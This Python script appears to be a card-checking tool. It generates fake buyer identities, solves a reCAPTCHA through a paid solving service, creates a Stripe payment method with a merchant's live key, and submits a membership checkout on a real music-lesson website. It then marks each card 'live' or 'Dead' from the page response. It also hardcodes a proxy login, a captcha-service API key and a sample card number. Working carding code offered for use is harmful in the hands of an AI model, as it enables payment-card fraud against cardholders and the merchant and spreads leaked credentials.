
import random, time
from faker import Faker
from random import choice
from tkinter import Tk, filedialog
from httpx import request
import requests,re
from bs4 import BeautifulSoup as b
from bs4 import BeautifulSoup
#from hh import keep_alive
import requests
import json, string, re
import requests
import time
import json
import random, time
from faker import Faker
from random import choice
import asyncio
import requests
from bs4 import BeautifulSoup
import requests
import re
from bs4 import BeautifulSoup as b

from bs4 import BeautifulSoup

import json


import time
import re
def usuario() -> dict:
    number = random.randint(1111, 9999)
    postal = random.choice(['10080', '14925', '71601', '86556', '19980'])
    return { 'name' : Faker().name(), 'email' : Faker().email().replace('@', '{}@'.format(number)), 'username' : Faker().user_name(), 'phone' : '512678{}'.format(number), 'city' : Faker().city(), 'code' : postal }


def capture(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]

    except ValueError:
        return None

def get_random_proxy(file_path="proxys.txt"):
    with open(file_path, "r") as f:
        proxies = f.readlines()
    
    proxy = random.choice(proxies).strip()  # Elegir un proxy aleatorio
    host_port, user_pass = proxy.split("@")  # Separar IP y usuario:contraseña
    host, port = host_port.split(":")  # Separar IP y puerto
    user, password = user_pass.split(":")  # Separar usuario y contraseña
    
    return host, port, user, password

def procesar_tarjeta(card: str) -> str:   
    max_retries = 15
    retry_count = 0
    while retry_count < max_retries:
        try:
            #============[Funcions Need]============#
            proxy_user = "package-322189-country-mx-region-yucatan-city-merida-isp-telmex+fibra"
            proxy_pass = "SKRo8Dkct0MlViur"
            proxy_host = "proxy.soax.com"
            proxy_port = 5000

            # Crear la URL del proxy
            proxy_url = f"http://{proxy_user}:{proxy_pass}@{proxy_host}:{proxy_port}"

            # Crear sesión
            c = requests.Session()

            # Configurar proxy en la sesión
            proxies = {
                "http": proxy_url,
                "https": proxy_url,
            }

            
            
            cc_number, mes, ano_number, cvv = card.split('|')
            if len(ano_number) == 2: ano_number = "20"+ano_number
           

            #============[Address Found]============#
            name  = usuario()['name'].split(' ')[0]
            last  = usuario()['name'].split(' ')[1]
            email = usuario()['email']
            number = random.randint(1111, 9999)
            street = f"{name} street {number}"
            phone = usuario()['phone']
           

            #============[Requests 1]============#
            api_key = "5ce129ec4745149faf2ff1cc16166a71"

            # Sitio donde está el reCAPTCHA
            website_url = "https://americanfiddlemethod.com/membership-account/membership-checkout/"

            # Sitekey extraído del HTML del sitio (en el <div class="g-recaptcha" data-sitekey="...">)
            sitekey = "6LcQYk4kAAAAAAt54iT1SUiv6AGwGrfZjtq2iVvz"

            # Paso 1: Crear la tarea
            create_task_payload = {
                "clientKey": api_key,
                "task": {
                    "type": "NoCaptchaTaskProxyless",  # No usas proxy
                    "websiteURL": website_url,
                    "websiteKey": sitekey
                }
            }

            print("📤 Enviando captcha a CapMonster...")

            response = requests.post("https://api.capmonster.cloud/createTask", json=create_task_payload)
            result = response.json()

            if result.get("errorId") != 0:
                print("❌ Error al crear tarea:", result.get("errorCode"))
                exit()

            task_id = result["taskId"]
            print("🆔 Tarea creada con ID:", task_id)

            # Paso 2: Consultar la solución
            get_result_payload = {
                "clientKey": api_key,
                "taskId": task_id
            }

            for i in range(20):
                time.sleep(5)  # espera entre intentos
                res = requests.post("https://api.capmonster.cloud/getTaskResult", json=get_result_payload)
                res_json = res.json()

                if res_json.get("status") == "ready":
                    token = res_json["solution"]["gRecaptchaResponse"]
                    print("✅ CAPTCHA resuelto con éxito.")
                   
                    break
                else:
                    print(f"⏳ Esperando respuesta ({i+1}/20)...")

            else:
                print("❌ Tiempo de espera agotado.")
            headers = {
                'authority': 'api.stripe.com',
                'accept': 'application/json',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'pragma': 'no-cache',
                'referer': 'https://js.stripe.com/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            data = f'type=card&card[number]={cc_number}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano_number}&guid=2953e2d9-6a1c-4c42-a83e-28bb4e237f8577fee5&muid=7540fa0e-ab48-4ebd-bceb-6487084778dee71c4e&sid=627a8956-0271-4dfb-b007-fe658d323473e60421&pasted_fields=number&payment_user_agent=stripe.js%2Fc264a67020%3B+stripe-js-v3%2Fc264a67020%3B+split-card-element&referrer=https%3A%2F%2Famericanfiddlemethod.com&time_on_page=91488&client_attribution_metadata[client_session_id]=c687d9c3-b555-466f-9a7d-c69ae9b52717&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=split-card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_lacL2tGh4dre5YxSIDEaa3U4&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwZCI6MCwiZXhwIjoxNzY3MDQyNjU3LCJjZGF0YSI6InNNbGx3K0E3MzNYNXRBNVZiZU9xVHJNQ0VGNnlMcGpJdUFpRHF6T0NSVXV0blF3MTNKUlVDcThGaFRnTWlNRjZ4Z2FUSnhFNnNnMWU1RGI2QnJDZER6MmxVdTdmN2I5OHVYVXhQelpTdzBzTnlheUxLbHNXb05PTWpZTC85M3hEM1R1NGdndktCeVB4UUVYWGhnZSt4cFV3blY3TStXYUQ3MFh2bC95WnROZ1ByN1crc0xTN1hFWVlkd2IrRUtPbDBTMW9LdEZzMWttSmo4QU4iLCJwYXNza2V5IjoiOHBjSks1UHFBL0k4eVJnZHFjOFBrNTQ1VTRlWHV6bWVJWlpQOXBiN2tOWGJ4YWU2K1FlbVhOb0cveXhSV3cyVmRnaHdqcmNsdjZFNTcybmRNN2ZaTnR4bVIxRW00YzloZDh5eWdDeUhrNVFiR3hnODMyQitrcWs2N2g4enJXYW80dDdvb0REZ09oY1JzQjArcDdRbnh2TlFVS1M3R3JNbXBRcVpRN3pEaU84cTRkaVFlQnRsMGpWRGthVHR2ajlNeGx5ZUsvdHhDN21IdjZEMWE1RUZUZkdpQWRoS092ang4SE9nQko1d0RnQk12eUhnQjFnZWI4TldlLzF0UC9EV25Ra20yMXdGRThSdXpvQ1RGRXYraWlpSHQyNkNMZlFlRTQ3OWpMdU5YQVRJWE14UVdNRE5leFpzVDZyZk9aZWJRSFV1d2U4YzdZTUNUdEtuT0I1VEpqelIrRkJSRWtDcnpKTGcyenA4TGRFY2pnRXBzZkRmc2t0ZTc5dStYN2hCZ3FlZ09VL0dkUGpiTTRvU0FZaWNmSGNST280aUhrb2VUTSs5a0U5cGo4NnpwZzM0Umd1Y2t4ZFBSalFjTmFaRkdKQ0dtVU9EWFhUb2hDZ3V1WnBoRHhRR0RTdnd6K1hwTEY4b3VLR1NxZmJMOFhoWklSY2taZFFPSC83dzdUckI5T2tBczRtSFpKRVd0L2NpYjAwdmE1NTRCY3BrUkp0TEJacjdmSTF2QzdSWmdWWVAwNjF5QldvU3pnaUN1ZHAreUM0Sy9mWU1zdkg3L0pnTzVaU0tjZXVPUERPQjRyM2xtRXJRbW1EQXBuelVtVi9hekJJSnhDRnJYM0Vwb25WTk5xdDV6VlhyM3dzWmN2b2VidXlhdEhwTXFuVkZ5SVJ6V0owYUVDMjY5UDZ6dFdIczRsZUwwQmNpc1pWbXVPZzR1UzZ2bmQwVStsMWZHYkpxdWxQM3FRT1pGdWgreTBJMVJJWUxqU1pUeXFIMlUrcGt1SFlxUE4xZVRuaEZvNDQ5ZkVwenlxU0lxdFptNjBrVERicVVyTlBOZzgxbU9TdVZ4SVQ1Wm5KNTVBby9jcmhHM0RibzNEMTl3U2tDdldHRU1tT2dEWldvVVBmVWk5RjVDdVVQcU0zb1BtVDRqOTZZWWJ1QktsU2RDd215bUkwRnEwSTNDV1I5REVZc1BsejhuN1N0UXZHU3FPbnhxRFhDN3E3TWw5RVhwMHh3RUNLZVFwcFhZZnpKa0RKU3Z4R0FNOHVteTh6RTBGSjRJa3RKVUhvT1d4dURURGxhZXBBbDNEM296dmVKaFFWajMwelQ5bDM0bUVHbWlwczl6eXNCbVVQclhYUzhIVlAzU1dIdVRDWEczQmticWdUN1oxYkhISk9pQmROOGVLeGFuNTllaC9HejZiMTRBS0tudjc0R25CMnpVbzFyR0VHSnlvYXgzTEd6eWhMYWJ2MTdKTDJ4TmJEWGNMT2RFVzBvK3pRWm92Snh4cmp1RjNZYXZ0dngxYWswMDlKSXV1NUtMU3RoUi96MmpJT1N2eld2b0s3RHlWNVcwY2NLaXZjZjZwSGZ6bTd5d0VHM2RUR1NzQ3dWWVF6Y3lpZEFEZUFkZzJqRWFBTGpyN2JYMExOZGd4aUNxM0hsZVJHa2k2Tk1WRXpwRW5qcHZhVzU4WThKYnc2K2NwUHBRalZZbk9hS1c1SThHWlpDemNveUFaTG5HZHlYTTJDS0g4WTg5YjdwNmM3WlJUWlEvVkEzbU9mRTVUR3Bqa2lkOFl1bHJUSjNhSlFaUGpScHF5R0RJRlRXd01yUlN6Z0xsandXRy9QdGMwVThCclpiSmprVHovZVRzYmRYRjFnbDlqSTBsbFpVTCt3NEhvT3JXYitMY1pvUjRLVVZwTW84MFBBbHZiSWdQQzQyT3Y5UTJuRlA4UXVaVWpPWG9maTVnam80SGpTdDJYM296eTRMeUVpTXVkS21Camc2MEVYQmoxdytVWWoyQXlOUjRGS1lPVUwzZE9IaWpnOWtZYnNHODNKMnhqSVVRYVM3cGFGU0c0RWxjQUdwK05KNjBXdWVINEc1a25PS01JYkNhZTJwLzVHYURuVWwyT0JWK0ZmUkU1Zmw0d0dud3R1d0tqbHFab1Z3VzNnWERoMnByLzhZR0w4Uy9vWGJHV2dhbFlhWDgrSGlrTmpvVXBKOVVwcnpZa2I2WHQ3RlVqeEpKc0tqbW9raXk0cFJ1cTJkOGFmNmdNbHM5aTBzTTd4ekNoSkxTRWM1THZ4VnJDa3RrUlUyd0N6UUlhU2RLSlhwdVZZQ2N6dmVDWnJpcnJZMS85dFJCQ2U3eFViMjlDdFpBUFpIUHRFM3ZWNmNUSi95RUExREw3Rm44WWlkcUhvSFpLcGR3RHNHREtkMmp5VjdMOWZNU292d3lMWTQyVmd6d3R6QW9qTkxJTXY4endDTjh0b2cvN0RqZUs0UE5xUDZSZG8vL0VUZHVReXFrNUczb1YyZHUxMjJrUldISkxIdXIzeFg1cWt2ZFpmSk9sbkNTS01CK0tOZ05JSXZwS0ZXMWRCWHdrU1VBS2J4V3FXL0VST2RFWWVMcTNSanM3TlMrbzlEUjVJWnBwRVpZU0locDMwOWlRWEpMeGppc0xzSC90R0lhT2hhaVRwNDVvSTVoUT09Iiwia3IiOiIzYTBmOGRjOCIsInNoYXJkX2lkIjoyMjE5OTYwNzN9.CmIXXiITUp4stC7aPUUlnK_5oMFG-nLKaMYNanjFfNg'

            response = c.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
            responsePm = json.loads(response.text)
            payment_method_id = responsePm["id"]
            print(payment_method_id)

            headers = {
                'authority': 'americanfiddlemethod.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'application/x-www-form-urlencoded',
                # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-12-29%2021%3A08%3A54%7C%7C%7Cep%3Dhttps%3A%2F%2Famericanfiddlemethod.com%2Fmembership-account%2Fmembership-checkout%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2025-12-29%2021%3A08%3A54%7C%7C%7Cep%3Dhttps%3A%2F%2Famericanfiddlemethod.com%2Fmembership-account%2Fmembership-checkout%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F116.0.0.0%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Famericanfiddlemethod.com%2Fmembership-account%2Fmembership-checkout%2F; __stripe_mid=7540fa0e-ab48-4ebd-bceb-6487084778dee71c4e; __stripe_sid=627a8956-0271-4dfb-b007-fe658d323473e60421; pmpro_visit=1',
                'origin': 'https://americanfiddlemethod.com',
                'pragma': 'no-cache',
                'referer': 'https://americanfiddlemethod.com/membership-account/membership-checkout/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            data = {
                'pmpro_level': '24',
                'checkjavascript': '1',
                'pmpro_other_discount_code': '',
                'username': name+last,
                'password': 'Saiper123',
                'password2': 'Saiper123',
                'first_name': name,
                'last_name': last,
                'bemail': email,
                'bconfirmemail': email,
                'fullname': '',
                'pmproship_same_billing_address_checkbox': '1',
                'pmpro_sfirstname': name,
                'pmpro_slastname': last,
                'pmpro_saddress1': 'calle o242',
                'pmpro_saddress2': '',
                'pmpro_scity': 'Teabo',
                'pmpro_sstate': 'Yucatán',
                'pmpro_szipcode': '97910',
                'pmpro_sphone': '9971556986',
                'pmpro_scountry': 'MX',
                'CardType': 'visa',
                'pmpro_discount_code': '',
                'g-recaptcha-response': token,
                'pmpro_checkout_nonce': 'b0f7d95927',
                '_wp_http_referer': '/membership-account/membership-checkout/',
                'submit-checkout': '1',
                'javascriptok': '1',
                'payment_method_id': payment_method_id,
                'AccountNumber': cc_number,
                'ExpirationMonth': mes,
                'ExpirationYear': ano_number,
            }

            response = c.post(
                'https://americanfiddlemethod.com/membership-account/membership-checkout/',
                headers=headers,
                data=data,
            )


            html = response.text

            soup = BeautifulSoup(html, "html.parser")

            # Buscar mensaje de error o éxito de Paid Memberships Pro
            mensaje = soup.find("div", class_="pmpro_message")

            if mensaje:
                texto = mensaje.get_text(strip=True)
                print("Mensaje de la página:", texto)
                return {"status": "Dead", "message": texto , "cc": card}
            else:
                print("No se encontró mensaje en la página")
                return {"status": "live", "message": "Live Auth" , "cc": card}
            

        except Exception as e:
            print(e)
            retry_count += 1
    else:

        return {"card": card, "status": "ERROR", "resp":  f"Retries: {retry_count}"}


if __name__ == "__main__":
    print(procesar_tarjeta("4268070366401182|02|2029|000"))
